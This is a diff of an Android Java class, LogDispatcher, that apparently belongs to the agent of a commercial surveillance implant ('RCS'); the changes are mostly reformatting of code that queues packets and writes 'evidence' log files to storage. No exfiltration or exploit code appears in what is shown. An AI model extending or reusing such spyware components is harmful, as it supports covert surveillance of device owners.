@@ -8,11 +8,7 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI;
 
-import java.io.BufferedOutputStream;
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.OutputStream;
 import java.util.HashMap;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
@@ -20,42 +16,39 @@ import java.util.concurrent.locks.Condition;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
 
-import android.os.Environment;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.utils.Check;
-import com.ht.RCSAndroidGUI.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class LogDispatcher.
  */
 public class LogDispatcher extends Thread implements Runnable {
-	
+
 	/** The singleton. */
 	private volatile static LogDispatcher singleton;
-	
+
 	/** The q. */
 	private final BlockingQueue<Packet> q;
-	
+
 	/** The log map. */
 	private final HashMap<Long, Evidence> evidences;
 
 	/** The halt. */
 	private boolean halt;
-	
+
 	/** The sd dir. */
 	private File sdDir;
 
 	/** The lock. */
 	final Lock lock = new ReentrantLock();
-	
+
 	/** The no logs. */
 	final Condition noLogs = lock.newCondition();
 
-	private String TAG = "LogDispatcher";
-	
+	private final String TAG = "LogDispatcher";
 
 	/*
 	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
@@ -106,14 +99,16 @@ public class LogDispatcher extends Thread implements Runnable {
 			Log.d("RCS", "processQueue() got LOG_CREATE");
 			createLog(p);
 			break;
-			
+
 		case LogR.LOG_ATOMIC:
 			Log.d("RCS", "processQueue() got LOG_ATOMIC");
 			atomicLog(p);
 			break;
 
 		case LogR.LOG_APPEND:
-			Log.e("RCS", "processQueue() got LOG_APPEND: DEPRECATED, use write");
+			Log
+					.e("RCS",
+							"processQueue() got LOG_APPEND: DEPRECATED, use write");
 			writeLog(p);
 			break;
 
@@ -129,12 +124,12 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		case LogR.LOG_REMOVE:
 			Log.e("RCS", "processQueue() got LOG_REMOVE: DEPRECATED");
-			//removeLog(p);
+			// removeLog(p);
 			break;
 
 		case LogR.LOG_REMOVEALL:
 			Log.e("RCS", "processQueue() got LOG_REMOVEALL: DEPRECATED");
-			//removeAll();
+			// removeAll();
 			break;
 
 		case LogR.LOG_WRITEMRK:
@@ -152,7 +147,7 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/**
 	 * Self.
-	 *
+	 * 
 	 * @return the log dispatcher
 	 */
 	public static LogDispatcher self() {
@@ -167,9 +162,12 @@ public class LogDispatcher extends Thread implements Runnable {
 		return singleton;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see java.lang.Thread#run()
 	 */
+	@Override
 	public void run() {
 		Log.d("RCS", "LogDispatcher started");
 
@@ -207,8 +205,9 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/**
 	 * Send.
-	 *
-	 * @param o the o
+	 * 
+	 * @param o
+	 *            the o
 	 * @return true, if successful
 	 */
 	public synchronized boolean send(final Packet packet) {
@@ -246,25 +245,26 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/**
 	 * Write markup.
-	 *
-	 * @param p the p
+	 * 
+	 * @param p
+	 *            the p
 	 * @return true, if successful
 	 */
 	private boolean writeMarkup(final Packet p) {
 		try {
 			File file = null;
 			final String markupName = "QZM-" + p.getType() + ".mrk";
-	
+
 			file = new File(sdDir, markupName);
-	
+
 			final boolean created = file.createNewFile();
-	
+
 			if (created == false) {
 				return false;
 			}
-	
+
 			// TODO: Scrivi nel file
-	
+
 			return true;
 		} catch (final Exception e) {
 			Log.d("RCS", "LogDispatcher.createLog() exception detected");
@@ -275,31 +275,36 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/**
 	 * Creates the log.
-	 *
-	 * @param p the p
+	 * 
+	 * @param p
+	 *            the p
 	 * @return true, if successful
 	 */
-	private boolean createLog(final Packet p) {	
-		Check.ensures(!evidences.containsKey(p.getId()),"evidence already mapped");
+	private boolean createLog(final Packet p) {
+		Check.ensures(!evidences.containsKey(p.getId()),
+				"evidence already mapped");
 
-		byte[] additional = p.getAdditional();
-		Evidence evidence = new Evidence(p.getType());
+		final byte[] additional = p.getAdditional();
+		final Evidence evidence = new Evidence(p.getType());
 		evidence.createEvidence(additional);
-		evidences.put(p.getId(),evidence);
-		
+		evidences.put(p.getId(), evidence);
+
 		return true;
 	}
 
 	/**
-	 * Creates a simple log, copies the payload and closes it in one atomic step.
+	 * Creates a simple log, copies the payload and closes it in one atomic
+	 * step.
+	 * 
 	 * @param p
 	 */
-	private void atomicLog(Packet p) {
-		Check.ensures(!evidences.containsKey(p.getId()),"evidence already mapped");
-		
-		byte[] additional = p.getAdditional();
-		byte[] data = p.peek();
-		Evidence evidence = new Evidence(p.getType());
+	private void atomicLog(final Packet p) {
+		Check.ensures(!evidences.containsKey(p.getId()),
+				"evidence already mapped");
+
+		final byte[] additional = p.getAdditional();
+		final byte[] data = p.peek();
+		final Evidence evidence = new Evidence(p.getType());
 		evidence.createEvidence(additional);
 		evidence.writeEvidence(data);
 		evidence.close();
@@ -307,42 +312,42 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/**
 	 * Write log.
-	 *
-	 * @param p the p
+	 * 
+	 * @param p
+	 *            the p
 	 * @return true, if successful
 	 */
 	private boolean writeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			Log.d(TAG , "Requested log not found");
+			Log.d(TAG, "Requested log not found");
 			return false;
 		}
-		
-		Evidence evidence = evidences.get(p.getId());
-		boolean ret = evidence.writeEvidence(p.peek());
-		return ret;
-		
-	}
 
+		final Evidence evidence = evidences.get(p.getId());
+		final boolean ret = evidence.writeEvidence(p.peek());
+		return ret;
+
+	}
 
 	/**
 	 * Close log.
-	 *
-	 * @param p the p
+	 * 
+	 * @param p
+	 *            the p
 	 * @return true, if successful
 	 */
 	private boolean closeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			Log.d(TAG , "Requested log not found");
+			Log.d(TAG, "Requested log not found");
 			return false;
 		}
 
 		// Rename .tmp to .log
-		Evidence evidence = evidences.get(p.getId());
+		final Evidence evidence = evidences.get(p.getId());
 		evidence.close();
 
 		return true;
 	}
-
 
 	/*
 	 * Inserire un Intent-receiver per gestire la rimozione della SD private
